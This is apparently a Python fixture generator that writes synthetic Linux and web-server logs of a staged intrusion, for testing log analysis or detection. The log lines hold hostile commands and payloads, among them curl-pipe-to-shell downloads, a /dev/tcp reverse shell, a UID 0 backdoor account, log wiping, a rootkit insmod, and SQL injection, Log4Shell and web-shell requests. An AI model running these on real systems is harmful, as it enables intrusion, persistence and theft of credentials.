"""Generate a small, realistic attack scenario across auth.log, audit.log and journald JSON.

Scenario (host web01, 2026-11-05):
  09:00  normal admin login (alice, publickey) + sudo
  10:00  SSH brute force + spraying from 203.0.113.50, then success as 'deploy'
  10:07  attacker: discovery, download|sh, reverse shell, persistence, history wipe
  10:15  new UID0 user, added to sudo, crontab replaced, ld.so.preload
  10:20  kernel module taint (journald)
"""

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).parent / "samples"
OUT.mkdir(exist_ok=True)
H = "web01"
T0 = datetime(2026, 11, 5, 9, 0, 0, tzinfo=timezone.utc)


def syslog_ts(dt):
    return dt.strftime("%b %e %H:%M:%S")


auth = []


def a(dt, prog, pid, msg):
    auth.append(f"{syslog_ts(dt)} {H} {prog}[{pid}]: {msg}" if pid else f"{syslog_ts(dt)} {H} {prog}: {msg}")


# --- benign
a(T0, "sshd", 1001, "Accepted publickey for alice from 10.0.0.5 port 50122 ssh2: ED25519 SHA256:abc")
a(T0, "sshd", 1001, "pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)")
a(T0 + timedelta(minutes=2), "sudo", None, "   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update")
a(T0 + timedelta(minutes=3), "CRON", 1200, "(root) CMD (cd / && run-parts --report /etc/cron.hourly)")

# --- brute force + spraying
t = T0 + timedelta(hours=1)
users = ["admin", "test", "oracle", "ubuntu", "postgres", "deploy"]
for i in range(24):
    u = users[i % len(users)]
    t += timedelta(seconds=7)
    if u != "deploy":
        a(t, "sshd", 2000 + i, f"Invalid user {u} from 203.0.113.50 port {40000 + i}")
        a(t, "sshd", 2000 + i, f"Failed password for invalid user {u} from 203.0.113.50 port {40000 + i} ssh2")
    else:
        a(t, "sshd", 2000 + i, f"Failed password for deploy from 203.0.113.50 port {40000 + i} ssh2")
t += timedelta(seconds=20)
a(t, "sshd", 2100, "Accepted password for deploy from 203.0.113.50 port 41000 ssh2")
a(t, "sshd", 2100, "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)")
t += timedelta(minutes=1)
a(t, "sudo", None, "  deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")

# --- persistence via accounts
t = T0 + timedelta(hours=1, minutes=15)
a(t, "useradd", 3001, "new group: name=sysupd, GID=0")
a(t, "useradd", 3001, "new user: name=sysupd, UID=0, GID=0, home=/var/lib/sysupd, shell=/bin/bash, from=/dev/pts/1")
a(t + timedelta(seconds=5), "usermod", 3002, "add 'sysupd' to group 'sudo'")
a(t + timedelta(seconds=10), "passwd", 3003, "pam_unix(passwd:chauthtok): password changed for root")
a(t + timedelta(seconds=30), "crontab", 3004, "(root) REPLACE (root)")
a(t + timedelta(minutes=1), "CRON", 3005, "(root) CMD (curl -s http://198.51.100.7/u.sh | bash)")
a(t + timedelta(minutes=2), "sshd", 3100, "Accepted password for root from 198.51.100.7 port 51515 ssh2")
(OUT / "auth.log").write_text("\n".join(auth) + "\n")

# --- auditd
audit = []
serial = 9000


def execve(dt, exe, args, pid, ppid, uid="0", cwd="/root", key="exec"):
    global serial
    serial += 1
    ts = f"{dt.timestamp():.3f}"
    hdr = f"msg=audit({ts}:{serial})"
    comm = exe.rsplit("/", 1)[-1]
    audit.append(f'type=SYSCALL {hdr}: arch=c000003e syscall=59 success=yes exit=0 a0=55d a1=55e a2=55f a3=0 items=2 '
                 f'ppid={ppid} pid={pid} auid=1001 uid={uid} gid=0 euid={uid} suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 '
                 f'tty=pts1 ses=7 comm="{comm}" exe="{exe}" key="{key}"')
    parts = []
    for i, arg in enumerate(args):
        if " " in arg or '"' in arg:
            parts.append(f"a{i}={arg.encode().hex().upper()}")
        else:
            parts.append(f'a{i}="{arg}"')
    audit.append(f"type=EXECVE {hdr}: argc={len(args)} " + " ".join(parts))
    audit.append(f'type=CWD {hdr}: cwd="{cwd}"')
    audit.append(f'type=PATH {hdr}: item=0 name="{exe}" inode=1 dev=08:01 mode=0100755 ouid=0 ogid=0 nametype=NORMAL')
    audit.append(f"type=PROCTITLE {hdr}: proctitle={' '.join(args).encode().hex().upper()}")
    audit.append(f"type=EOE {hdr}:")


def filecreate(dt, exe, path, pid, ppid):
    global serial
    serial += 1
    hdr = f"msg=audit({dt.timestamp():.3f}:{serial})"
    audit.append(f'type=SYSCALL {hdr}: arch=c000003e syscall=257 success=yes exit=3 items=2 ppid={ppid} pid={pid} '
                 f'auid=1001 uid=0 gid=0 euid=0 tty=pts1 ses=7 comm="{exe.rsplit("/",1)[-1]}" exe="{exe}" key="persist"')
    audit.append(f'type=CWD {hdr}: cwd="/root"')
    audit.append(f'type=PATH {hdr}: item=0 name="{path.rsplit("/",1)[0]}/" inode=2 dev=08:01 mode=040755 nametype=PARENT')
    audit.append(f'type=PATH {hdr}: item=1 name="{path}" inode=3 dev=08:01 mode=0100644 nametype=CREATE')
    audit.append(f"type=EOE {hdr}:")


t = T0 + timedelta(hours=1, minutes=7)
execve(t, "/bin/bash", ["bash"], 5000, 2100)
execve(t + timedelta(seconds=5), "/usr/bin/whoami", ["whoami"], 5001, 5000)
execve(t + timedelta(seconds=6), "/usr/bin/id", ["id"], 5002, 5000)
execve(t + timedelta(seconds=20), "/bin/bash", ["bash", "-c", "curl -fsSL http://198.51.100.7/x.sh | sh"], 5003, 5000)
execve(t + timedelta(seconds=40), "/bin/bash", ["bash", "-c", "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"], 5004, 5000)
execve(t + timedelta(seconds=50), "/tmp/.x/kworker", ["/tmp/.x/kworker", "-d"], 5005, 5000)
execve(t + timedelta(seconds=55), "/usr/bin/chmod", ["chmod", "u+s", "/tmp/.x/sh"], 5006, 5000)
filecreate(t + timedelta(minutes=8), "/usr/bin/tee", "/etc/ld.so.preload", 5010, 5000)
filecreate(t + timedelta(minutes=8, seconds=5), "/usr/bin/vim", "/root/.ssh/authorized_keys", 5011, 5000)
filecreate(t + timedelta(minutes=8, seconds=9), "/usr/bin/cp", "/etc/systemd/system/sysupd.service", 5012, 5000)
execve(t + timedelta(minutes=9), "/usr/sbin/insmod", ["insmod", "/tmp/.x/diamorphine.ko"], 5013, 5000)
execve(t + timedelta(minutes=10), "/bin/rm", ["rm", "-f", "/root/.bash_history", "/var/log/wtmp"], 5014, 5000)
execve(t + timedelta(minutes=10, seconds=2), "/bin/bash", ["bash", "-c", "history -c"], 5015, 5000)
# enriched-format record (ausearch --format raw keeps \x1d separator)
serial += 1
audit.append(f"type=USER_AUTH msg=audit({(t + timedelta(minutes=11)).timestamp():.3f}:{serial}): pid=6000 uid=0 auid=4294967295 ses=4294967295 "
             f"msg='op=PAM:authentication grantors=? acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=198.51.100.7 addr=198.51.100.7 terminal=ssh res=failed'"
             "\x1dUID=\"root\" AUID=\"unset\"")
(OUT / "audit.log").write_text("\n".join(audit) + "\n")

# --- journald export (journalctl -o json)
J = []


def j(dt, ident, pid, msg, **extra):
    rec = {"__REALTIME_TIMESTAMP": str(int(dt.timestamp() * 1e6)), "_HOSTNAME": H, "SYSLOG_IDENTIFIER": ident,
           "_PID": str(pid), "MESSAGE": msg, "_TRANSPORT": "kernel" if ident == "kernel" else "syslog", **extra}
    J.append(json.dumps(rec))


t = T0 + timedelta(hours=1, minutes=20)
j(t, "kernel", 0, "diamorphine: loading out-of-tree module taints kernel.")
j(t + timedelta(seconds=1), "kernel", 0, "diamorphine: module verification failed: signature and/or required key missing - tainting kernel")
j(t + timedelta(seconds=30), "rsyslogd", 700, '[origin software="rsyslogd"] exiting on signal 15.')
j(t + timedelta(minutes=1), "systemd", 1, "Started sysupd.service - System Update Daemon.", _SYSTEMD_UNIT="init.scope")
(OUT / "journal.json").write_text("\n".join(J) + "\n")
print(f"wrote samples to {OUT}")

# --- web server logs (Apache combined access, nginx JSON access, Apache + nginx error logs)
W = OUT / "web"
W.mkdir(exist_ok=True)
acc = []


def req(dt, ip, method, uri, status, size, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)", ref="-", user="-"):
    ts = dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
    acc.append(f'{ip} - {user} [{ts}] "{method} {uri} HTTP/1.1" {status} {size} "{ref}" "{ua}"')


t = T0 + timedelta(minutes=30)
for i in range(30):                                   # benign browsing
    req(t + timedelta(seconds=i * 20), f"192.0.2.{10 + i % 5}", "GET", ["/", "/blog/", "/css/site.css", "/about"][i % 4], 200, 5120)
t = T0 + timedelta(minutes=40)                        # gobuster content discovery
for i, w in enumerate(["admin", "backup", "old", "test", "dev", "api", "config", "db", "tmp", "private"] * 13):
    req(t + timedelta(seconds=i), "203.0.113.80", "GET", f"/{w}{i}/", 404, 196, ua="gobuster/3.6")
req(t + timedelta(minutes=3), "203.0.113.80", "GET", "/.env", 200, 812, ua="gobuster/3.6")
req(t + timedelta(minutes=3, seconds=1), "203.0.113.80", "GET", "/.git/config", 403, 199, ua="gobuster/3.6")
t = T0 + timedelta(minutes=50)                        # injection attempts
req(t, "203.0.113.81", "GET", "/item.php?id=1%20UNION%20ALL%20SELECT%201,@@version,3--", 200, 3400, ua="sqlmap/1.8.4#stable (https://sqlmap.org)")
req(t + timedelta(seconds=3), "203.0.113.81", "GET", "/item.php?id=1%27%20AND%20SLEEP(5)--%20-", 200, 3400, ua="sqlmap/1.8.4#stable (https://sqlmap.org)")
req(t + timedelta(seconds=9), "203.0.113.81", "GET", "/download.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd", 200, 2280)
req(t + timedelta(seconds=12), "203.0.113.81", "GET", "/index.php?page=php://filter/convert.base64-encode/resource=config", 200, 900)
req(t + timedelta(seconds=15), "203.0.113.81", "GET", "/ping.php?host=127.0.0.1;id", 200, 120)
req(t + timedelta(seconds=18), "203.0.113.81", "GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 200, 4000)
req(t + timedelta(seconds=21), "203.0.113.81", "GET", "/", 200, 5120, ua="${jndi:ldap://198.51.100.7:1389/a}")
req(t + timedelta(seconds=24), "203.0.113.81", "GET", "/hello?name={{7*7}}", 200, 30)
t = T0 + timedelta(minutes=55)                        # wp-login brute force, upload, web shell
for i in range(25):
    req(t + timedelta(seconds=i * 4), "203.0.113.82", "POST", "/wp-login.php", 200, 4200, ua="Mozilla/5.0")
req(t + timedelta(minutes=2), "203.0.113.82", "POST", "/wp-login.php", 302, 0, ua="Mozilla/5.0")
req(t + timedelta(minutes=3), "203.0.113.82", "POST", "/wp-admin/update.php?action=upload-plugin", 200, 1500, user="admin")
req(t + timedelta(minutes=4), "203.0.113.82", "GET", "/wp-content/uploads/2026/11/x.php?cmd=id", 200, 54)
req(t + timedelta(minutes=4, seconds=10), "203.0.113.82", "GET", "/wp-content/uploads/2026/11/x.php?cmd=cat%20/etc/shadow", 200, 1210)
(W / "access.log").write_text("\n".join(acc) + "\n")

# nginx JSON access log (log_format json escape=json ...)
nj = []
for i, (uri, st, ua) in enumerate([("/api/health", 200, "kube-probe/1.29"),
                                    ("/api/v1/users?id=1%20or%201=1", 200, "python-requests/2.31"),
                                    ("/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", 400, "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)")]):
    nj.append(json.dumps({"time_iso8601": (T0 + timedelta(hours=1, minutes=1, seconds=i)).isoformat(),
                          "remote_addr": "203.0.113.90", "request": f"GET {uri} HTTP/1.1", "status": st,
                          "body_bytes_sent": 120, "http_referer": "", "http_user_agent": ua, "host": "api.example.org"}))
(W / "nginx_access.json").write_text("\n".join(nj) + "\n")

(W / "apache_error.log").write_text(
    "[Thu Nov 05 09:59:10.123456 2026] [php7:warn] [pid 4411] [client 203.0.113.82:51234] PHP Warning:  "
    "system() has been disabled for security reasons in /var/www/html/wp-content/uploads/2026/11/x.php on line 3\n"
    "[Thu Nov 05 10:01:00.000000 2026] [core:notice] [pid 900] AH00052: child pid 4411 exit signal Segmentation fault (11)\n"
    "[Thu Nov 05 10:02:00.000000 2026] [security2:error] [pid 4412] [client 203.0.113.81:40000] ModSecurity: Access denied "
    "with code 403 (phase 2). Matched phrase \"union all select\" [id \"942100\"] [hostname \"www.example.org\"]\n")
(W / "nginx_error.log").write_text(
    '2026/11/05 10:03:00 [error] 812#812: *77 FastCGI sent in stderr: "PHP message: PHP Parse error: syntax error '
    "in /var/www/html/index.php(1) : eval()'d code on line 1\" while reading response header from upstream, client: "
    '203.0.113.82, server: www.example.org, request: "GET /x.php HTTP/1.1", upstream: "fastcgi://unix:/run/php.sock", host: "www.example.org"\n'
    '2026/11/05 10:04:00 [alert] 800#800: worker process 812 exited on signal 6 (core dumped)\n')
print(f"wrote web samples to {W}")

# --- a real-looking CentOS 7 /var/log with dateext rotation, compression, binaries
import bz2
import gzip
import lzma
import os
import struct

V = OUT / "varlog"
if V.exists():
    import shutil
    shutil.rmtree(V)
(V / "tuned").mkdir(parents=True)
(V / "journal" / "abc123").mkdir(parents=True)
(V / "sa").mkdir()
(V / "dracut.log-20151013").write_text(
    "Tue Oct 13 10:58:37 CEST 2015 Executing: /sbin/dracut -f /boot/initramfs-3.10.0-229.el7.x86_64.img\n"
    "*** Including module: bash ***\n*** Including module: nss-softokn ***\n"
    "Tue Oct 13 10:59:02 CEST 2015 *** Creating initramfs image file '/boot/initramfs.img' done ***\n")
(V / "yum.log-20151013").write_text(
    "Oct 12 09:00:01 Installed: 2:nmap-ncat-6.40-7.el7.x86_64\n"
    "Oct 12 09:00:03 Installed: socat-1.7.2.2-5.el7.x86_64\n"
    "Oct 12 09:01:00 Updated: bash-4.2.46-19.el7.x86_64\n")
(V / "messages-20151013").write_text(
    "Oct 12 23:59:58 centos7 systemd: Started Session 41 of user root.\n"
    "Oct 13 03:10:01 centos7 kernel: e1000: eth0 NIC Link is Up\n")
(V / "secure-20151013.xz").write_bytes(lzma.compress(
    b"Oct 13 08:00:00 centos7 sshd[900]: Accepted password for root from 198.51.100.23 port 40022 ssh2\n"))
(V / "maillog-20151013").write_bytes(gzip.compress(           # gzip without .gz extension
    b"Oct 13 08:01:00 centos7 postfix/pickup[1000]: 3F2A1: uid=0 from=<root>\n"))
(V / "cron-20151013.bz2").write_bytes(bz2.compress(
    b"Oct 13 08:02:00 centos7 CROND[1001]: (root) CMD (curl -s http://198.51.100.23/m | sh)\n"))
(V / "tuned" / "tuned.log").write_text(
    "2015-10-13 10:00:00,123 INFO     tuned.daemon.daemon: starting tuning\n"
    "2015-10-13 10:00:01,456 ERROR    tuned.plugins.base: failed to apply\n"
    "Traceback (most recent call last):\n  File \"x.py\", line 1\n")
(V / "firewalld").write_text("2015-10-13 10:05:00 ERROR: COMMAND_FAILED: '/sbin/iptables -w2 -t filter -X' failed\n")
(V / "cloud-init.log").write_text("2015-10-13 10:00:00,123 - util.py[DEBUG]: Running command ['ls']\n")
(V / "mariadb.log").write_text("151013 10:10:10 [Note] /usr/libexec/mysqld: ready for connections.\n"
                               "151013  9:11:12 [Warning] Access denied for user 'root'@'198.51.100.23'\n")
(V / "boot.log").write_text("[  OK  ] Started Show Plymouth Boot Screen.\n[  OK  ] Reached target Paths.\n")
(V / "dmesg.old").write_text("[    0.000000] Initializing cgroup subsys cpuset\n[    0.000000] Linux version 3.10.0\n")
(V / "anaconda.log").write_text("10:00:00,123 INFO anaconda: version 21.48\n10:00:01,001 INFO anaconda: Starting\n")
(V / "spooler-20151013").write_text("")
(V / "boot.log-20151013").write_text("\n\n")
(V / "journal" / "abc123" / "system.journal").write_bytes(b"LPKSHHRH" + b"\x00" * 248)
(V / "sa" / "sa13").write_bytes(b"\x96\xd5" + b"\x00\x01" * 200)


def utmp(typ, pid, line, uid, user, host, sec, ip=None):
    addr = (bytes(int(x) for x in ip.split(".")) + b"\x00" * 12) if ip else b"\x00" * 16
    return struct.pack("<hxxi32s4s32s256shhiii16s20s", typ, pid, line.encode(), uid.encode(), user.encode(),
                       host.encode(), 0, 0, 0, sec, 0, addr, b"")


t0 = int(datetime(2015, 10, 13, 8, 0, tzinfo=timezone.utc).timestamp())
wt = utmp(2, 0, "~", "~~", "reboot", "3.10.0-229.el7.x86_64", t0 - 3600)
wt += utmp(7, 900, "pts/0", "ts/0", "root", "198.51.100.23", t0, "198.51.100.23")
wt += utmp(8, 900, "pts/0", "ts/0", "", "", t0 + 600)
(V / "wtmp").write_bytes(wt)
bt = b"".join(utmp(6, 800 + i, "ssh:notty", "", ["admin", "oracle", "test"][i % 3], "203.0.113.66", t0 - 300 + i * 5)
              for i in range(12))
(V / "btmp-20151101").write_bytes(bt)
ll = b"\x00" * 292 + struct.pack("<i32s256s", t0, b"pts/0", b"198.51.100.23")
(V / "lastlog").write_bytes(ll)
print(f"wrote /var/log-like samples to {V}")
